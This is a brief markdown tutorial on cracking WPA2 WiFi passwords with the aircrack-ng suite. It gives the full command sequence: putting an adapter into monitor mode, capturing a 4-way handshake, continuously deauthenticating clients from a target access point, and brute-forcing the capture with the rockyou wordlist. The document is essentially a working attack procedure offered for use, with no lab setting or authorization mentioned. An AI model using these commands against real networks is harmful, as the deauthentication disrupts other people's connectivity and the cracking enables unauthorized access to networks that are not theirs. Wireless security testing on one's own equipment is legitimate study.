# Cracking WiFi WPA2 Hanshake
___
Index | Topic
--- | ---
**1** | Tools
**2** | Procedure

## Tools

- WiFi adapter that supports monitor mode
- airmon-ng

## Procedure

1. Connect the WiFi adapter
2. Check for conflicting processes with airmon: `sudo airmon-ng check kill`
3. Change de wifi adapter into monitor mode: `sudo airmon-ng start wlan0`
4. Find networks around you: `sudo airodump-ng wlan0mon`
5. Scan to capture a 4-way handshake: `sudo airodump-ng -w hack1 -c 2 --bssid xx:xx:xx:xx:xx:xx wlan0mon`
6. Deauthenticate clients from a network: `sudo aireplay-ng --deauth 0 -a xx:xx:xx:xx:xx:xx wlan0mon`
   - `--deauth 0` means we are not going to stop the deauthentications used against the access point
7. The moment someone connects to the network, we are going to capture the 4-way handshake
8. Use aircrack to try and crack the file `aircrack-ng hack1-01.cap -w /usr/share/wordlists/rockyou.txt`
9. If the password is in the wordlist, you should be ready to go!